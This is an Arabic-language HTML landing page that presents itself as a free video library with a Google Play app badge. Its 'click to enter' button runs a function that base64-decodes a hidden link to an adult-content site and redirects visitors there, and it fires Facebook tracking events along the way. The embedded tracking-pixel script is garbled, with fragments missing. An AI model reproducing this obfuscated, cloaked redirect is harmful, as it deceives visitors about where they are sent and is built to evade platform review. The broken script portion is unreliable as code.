<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>📽️ مكتبة الفيديو العربي المجاني</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">

  <!-- Facebook Pixel Code -->

  n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
  n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}

  <noscript>

         src="https://www.facebook.com/tr?id=1005754568034067&ev=PageView&noscript=1"/>
  </noscript>

  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
      background-color: #f5f7fa;
      color: #1f2937;
      direction: rtl;
    }
    header {
      background-color: #ffffff;
      text-align: center;
    }
    .hero-img {
      width: 100%;
      max-height: 300px;
      object-fit: cover;
    }
    header h1 {
      font-size: 28px;
      margin: 10px 0 5px;
    }
    header p {
      font-size: 16px;
      margin: 0 0 20px;
      color: #374151;
    }
    .main {
      max-width: 960px;
      margin: 0 auto;
      padding: 30px 20px;
    }
    .video-preview {
      position: relative;
      width: 100%;
      padding-top: 56.25%;
      background: #000 url('https://sarasmith199536.github.io/ttgg-landing/Player1/F/F1.jpg') center/cover no-repeat;
      border-radius: 16px;
      margin-bottom: 20px;
    }
    .cta-actions {
      text-align: center;
      margin-bottom: 40px;
    }
    .store-guides {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }
    .store-guides img {
      height: 60px;
      cursor: pointer;
    }
    .store-guides .note {
      font-size: 14px;
      color: #333;
    }

    .cta-btn {
      display: inline-block;
      background-color: #00bcd4;
      color: white;
      font-size: 18px;
      padding: 14px 30px;
      border: none;
      border-radius: 10px;
      text-decoration: none;
      transition: background-color 0.3s ease;
      font-weight: bold;
      cursor: pointer;
    }
    .cta-btn:hover {
      background-color: #0097a7;
    }
    footer {
      text-align: center;
      padding: 20px;
      font-size: 13px;
      color: #6b7280;
    }
    .footer-links {
      margin-top: 10px;
    }
    .footer-links a {
      margin: 0 10px;
      color: #00bcd4;
      text-decoration: none;
    }
    @media (max-width: 600px) {
      .store-guides {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <header>
    <img class="hero-img" src="https://sarasmith199536.github.io/ttgg-landing/Player1/Top/Top1.1.jpg" alt="صورة امرأة عربية">
    <h1 id="main-title">📽️ مكتبة الفيديو العربي المجاني</h1>
    <p id="subtitle">اكتشف أفضل محتوى فيديو مجاني باللغة العربية، بلا إعلانات مزعجة</p>
  </header>

  <section class="main">
    <div class="video-preview"></div>

    <div class="cta-actions">
      <div class="store-guides">
        <img src="https://sarasmith199536.github.io/ttgg-landing/assets/google-play-badge.png" alt="Google Play" id="google-play-btn"
             onclick="window.open('https://play.google.com/store/apps/details?id=com.hdvideo.player.offline','_blank')" />

        <img src="https://sarasmith199536.github.io/ttgg-landing/assets/arrow-guide.png" alt="Guide Arrow" style="width:80px">

        <div class="cta-btn" id="cta-entry" onclick="goToHiddenLink()">انقر هنا للدخول</div>
      </div>
    </div>
  </section>

  <footer>
    <div id="footer-text">جميع الحقوق محفوظة © 2025 - دليل الفيديو العربي</div>
    <div class="footer-links">
      <a href="/ttgg-landing/privacy.html" id="privacy">سياسة الخصوصية</a>
      <a href="/ttgg-landing/about.html" id="about">من نحن</a>
      <a href="/ttgg-landing/contact.html" id="contact">اتصل بنا</a>
    </div>
  </footer>

  <script>
    function goToHiddenLink() {
      const encoded = "aHR0cHM6Ly9wb3JuZHVkZS5vbmxpbmUvbWVRUg=="; // 更新后的短链
      const link = atob(encoded);
      fbq('trackCustom', 'EntryClick');
      window.location.href = link;
    }

    document.getElementById('google-play-btn')?.addEventListener('click', function () {
      fbq('trackCustom', 'GooglePlayClick');
    });

    // 多语言切换
    const lang = navigator.language || navigator.userLanguage;
    if (lang.startsWith('en')) {
      document.documentElement.lang = 'en';
      document.documentElement.dir = 'ltr';
      document.getElementById("main-title").textContent = "📽️ Free Arabic Video Library";
      document.getElementById("subtitle").textContent = "Discover high-quality Arabic video content with no ads";
      document.getElementById("cta-entry").textContent = "Click to Enter";
      document.getElementById("footer-text").textContent = "All rights reserved © 2025 - Arabic Video Guide";
      document.getElementById("privacy").textContent = "Privacy Policy";
      document.getElementById("about").textContent = "About Us";
      document.getElementById("contact").textContent = "Contact";
    }
  </script>
</body>
</html>
